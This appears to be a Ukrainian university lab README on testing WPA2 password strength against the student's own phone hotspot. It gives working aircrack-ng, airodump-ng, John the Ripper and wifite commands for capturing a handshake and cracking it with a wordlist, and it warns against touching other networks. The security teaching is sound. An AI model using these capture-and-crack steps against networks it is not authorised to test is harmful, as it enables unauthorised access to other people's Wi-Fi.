# Лабораторна робота № 11 — Стійкість паролів Wi-Fi

Матеріали до ЛР №11 «Дослідження стійкості точок доступу бездротової мережі Wi-Fi».

Тут немає власного «коду» як у ЛР №10 — робота полягає у використанні готових утиліт
(`aircrack-ng`, `wifite`, `John the Ripper`) проти **власної** точки доступу. Тому в цій
папці зібрано: покроковий гайд, шаблон звіту та допоміжні скрипти.

> **Тільки своя точка доступу.** Атакувати можна лише власну мережу (у нашому випадку —
> роздача з твого телефону). В ефірі ноут «бачитиме» сусідські мережі — їх чіпати не можна:
> це і вимога методички (пункт 1), і закону.

---

## 0. Головне про залізо (прочитай першим)

Тема потребує **режиму монітора** Wi-Fi-карти. Від цього залежить, чи вийде взагалі.

- **Windows + вбудований Wi-Fi → захопити handshake НЕ вийде.** Драйвери Windows не дають
  режим монітора для звичайних карт. Утиліти aircrack під Windows цього не вміють.
- **Kali у віртуальній машині → теж НЕ вийде** з вбудованою картою: VM не пробрасывает
  внутрішній Wi-Fi як бездротовий пристрій (бачить лише віртуальний Ethernet).
- **WSL2 → ні.** Немає доступу до радіо.

### Робочий шлях на ноуті з Windows: Kali Live USB

Ти завантажуєш ноут із **флешки з Kali** (Live-режим, без встановлення на диск, Windows
не чіпається). Kali працює з реальною вбудованою картою.

1. Скачай образ **Kali Linux Live** з офіційного сайту.
2. Запиши його на USB (≥8 ГБ) програмою **Rufus** (або balenaEtcher).
3. Перезавантаж ноут, зайди в Boot Menu (зазвичай F12/F9/Esc), обери завантаження з USB.
4. Обери **Live system**.

> ⚠️ **Перевір заздалегідь, а не перед преподом.** Вбудовані карти Intel зазвичай тягнуть
> **захоплення** в режимі монітора (інжекція/деавтентифікація часто не працює — але вона нам
> і не потрібна, див. нижче). Realtek/Broadcom — як пощастить. Зроби повний прогін удома.

### Якщо вбудована карта не тягне монітор навіть у Kali

Купи дешевий USB-Wi-Fi-адаптер з підтримкою monitor mode (напр. Alfa AWUS036NHA,
TP-Link TL-WN722N **v1**, або на чіпі RTL8812AU) — ~15–30$. Він гарантовано вирішує
питання і працює навіть із Kali у віртуалці.

---

## 1. Що потрібно, крім ноута

- **Телефон** — роздає точку доступу (це «жертва», твоя власна).
- **Другий пристрій-клієнт** — ще один телефон/планшет/ноут, який **підключиться** до роздачі.
  Він потрібен обовʼязково: handshake зʼявляється в момент підключення клієнта, а карта ноута
  в цей час зайнята прослуховуванням і сама клієнтом бути не може.

Схема: `телефон (точка) ← підключається → другий пристрій`, а `ноут (Kali) слухає ефір`.

---

## 2. Налаштування точки доступу на телефоні (критично)

- **Тип захисту: WPA2** (WPA2-Personal / WPA2-PSK). **НЕ WPA3!**
  WPA3 захищений від офлайн-перебору — атака просто не спрацює, і демо провалиться.
  На Android: налаштування точки доступу → Захист → WPA2. На iPhone — зазвичай WPA2.
- **Діапазон: 2.4 ГГц** (сумісніше з адаптерами, ніж 5 ГГц).
- Для двох частин демо по черзі постав два паролі:
  - **слабкий**, напр. `12345678` — щоб зламався миттєво;
  - **сильний**, напр. `k7$Rm2!qXz9@vL` — щоб словник його не знайшов.

---

## 3. Захоплення handshake (у Kali Live)

Дізнайся імʼя інтерфейсу: `iw dev` (зазвичай `wlan0`).

```bash
# прибрати служби, що заважають, і ввімкнути режим монітора
sudo airmon-ng check kill
sudo airmon-ng start wlan0            # інтерфейс стане wlan0mon

# знайти СВОЮ точку: запиши BSSID (MAC точки) і CH (канал)
sudo airodump-ng wlan0mon             # побачив свою ESSID → Ctrl+C

# слухати саме свою точку і писати в файл handshake-01.cap
sudo airodump-ng --bssid <ТВІЙ_BSSID> -c <КАНАЛ> -w handshake wlan0mon
```

Поки йде останній запис — **підключи другий пристрій до роздачі** (або вимкни/увімкни на
ньому Wi-Fi). Угорі праворуч зʼявиться `WPA handshake: <BSSID>` — готово, тисни `Ctrl+C`.

> Захоплення = просте прослуховування, інжекція не потрібна, бо клієнт підключаєш ти сам.
> Тому працює навіть на картах Intel без підтримки інжекції.

Або те саме одним скриптом:

```bash
sudo ./scripts/capture.sh <ТВІЙ_BSSID> <КАНАЛ> wlan0
```

## 4. Підбір пароля

**Гарантована демонстрація слабкого пароля** (маленький словник зі своїм паролем):

```bash
./scripts/make_wordlist.sh 12345678          # створить demo_wordlist.txt
aircrack-ng -w demo_wordlist.txt -b <ТВІЙ_BSSID> handshake-01.cap   # → KEY FOUND!
```

**Реалістичний словник** (у Kali лежить rockyou):

```bash
sudo gunzip /usr/share/wordlists/rockyou.txt.gz     # один раз, якщо .gz
aircrack-ng -w /usr/share/wordlists/rockyou.txt -b <ТВІЙ_BSSID> handshake-01.cap
```

**Сильний пароль:** перезахопи handshake на точці із сильним паролем і пусти той самий
`rockyou` → отримаєш `Passphrase not in dictionary`. Це і є доказ стійкості.

Або обгортка:

```bash
./scripts/crack.sh <ТВІЙ_BSSID> handshake-01.cap /usr/share/wordlists/rockyou.txt
```

### Варіант через John the Ripper (методичка його називає)

У Kali (John jumbo):

```bash
wpapcap2john handshake-01.cap > wpa.hash
john --wordlist=/usr/share/wordlists/rockyou.txt wpa.hash
john --show wpa.hash
```

### Найпростіше — wifite (автомат)

```bash
sudo wifite --dict /usr/share/wordlists/rockyou.txt
```

Покаже список мереж — обери **номер своєї** точки, решту не чіпай. Він сам захопить handshake
і підбере пароль.

---

## 5. Що зберегти для звіту

Під час прогону зафіксуй (це результати для звіту):

- ESSID, BSSID, канал, тип шифрування (WPA2-PSK CCMP);
- скрін рядка `WPA handshake: <BSSID>`;
- скрін `KEY FOUND! [ пароль ]`;
- час і швидкість перебору (aircrack показує `keys tested` і `k/s`);
- скрін, що сильний пароль не знайдено (`Passphrase not in dictionary`).

Готовий шаблон звіту — у файлі `ЗВІТ_ЛР11.md`. Впиши туди свої значення і встав скріншоти
на позначені місця.

---

## 6. Порядок дій під живу здачу

1. Удома: Kali Live USB → перевірити, що `airodump-ng` бачить мережі (монітор працює).
2. Удома: пройти весь цикл (слабкий → зламався, сильний → не зламався), зробити скріншоти,
   заповнити звіт.
3. У препода: показати той самий цикл наживо, потім відправити звіт на пошту.

Якщо монітор на твоїй карті так і не завівся — або USB-адаптер, або показуєш частину «підбір»
на вже захопленому `.cap` (обчислення пароля працюють і без монітора, навіть на Windows через
aircrack-ng for Windows / hashcat).
